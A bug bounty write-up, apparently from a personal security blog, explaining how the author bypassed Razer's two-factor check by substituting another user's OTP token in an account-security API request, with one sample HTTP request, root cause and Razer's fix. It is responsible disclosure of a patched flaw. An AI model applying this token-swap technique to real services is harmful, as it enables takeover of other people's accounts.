---
layout: post
title: "Razer OTP Bypass"
categories: "bugbounty"
---

Technical analysis of how I was able to bypass OTP code requirement in Razer.

This writeup is migrated from my [Medium][medium-article] article. The content is the same but this article focuses on the technical aspect of the vulnerability. If you want to know how the process from vulnerability report to interaction with Hackerone Triage and internal team went, check out the medium writeup. Lots of stuffs to learn there on report-writing aspects as well.

## Introduction

I had received a private invitation from Razer bug bounty program before it was publicly launched on Hackerone. But I didn't hack on it at that time. After it was launched, it took my attention and I decided to give it a go to see if I can find anything interesting.

Generally, I am more interested in bypassing security funtionalities implemented by the applications. After a little bit of surface-level recon of features offered by the application, I found 2FA implementation the most interesting. Let the actual hunt begin!

## Vulnerability Discovery

Analyzing the requests sent to the server during the whole process, I found that the flow of the requests passed looked like below:

![Flowchart](/assets/razer-flowchart.svg)

After the code is requested and a valid code is successfully entered, the OTP token is generated and used as a form of 2FA authentication on all requests that require you to enter the 2FA for.

_The OTP token was a very long and random alphanumeric value, impossible to guess or brute-force._

**After-2FA-code request:**

```
POST /api/emily/7/user-security/post HTTP/1.1
Host: razerid.razer.com
Connection: close
Content-Length: 260
Accept: application/json, text/plain, */*
Origin: https://razerid.razer.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
DNT: 1
Sec-Fetch-Mode: cors
Content-Type: application/json;charset=UTF-8
Sec-Fetch-Site: same-origin
Referer: https://razerid.razer.com/account/email
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: ...
{"data":"<COP><User><ID>user_id</ID><Token>user_token</Token><OTPToken>otp_token_value_here</OTPToken><login><email>attacker-email@example.com</email><method>add</method><primary>1</primary></login></User><ServiceCode>0060</ServiceCode></COP>"}
```

As previously stated, `<OTPToken>otp_token_value</OTPToken>` was used as a form of 2FA validator for all requests requiring 2FA.

After completely understanding this design flow of the application, I got a sudden urge to change the user A's `otp_token_value` with user B's `otp_token_value`. To my surprise, it worked! I was able to bypass OTP requirement by using another user's `otp_token_value`.

### Root Cause

The backend indeed validated whether the OTP code provided was valid or not. But it did not validate whose OTP token it was, hence, any user's valid token could be used as 2FA authentication for any user.

### Mitigation

Razer fixed the issue by validating whether the entered OTP token entered is their token or not.

**Bounty awarded:** $1,000

[medium-article]: https://medium.com/bugbountywriteup/how-i-was-able-to-bypass-otp-token-requirement-in-razer-the-story-of-a-critical-bug-fc63a94ad572
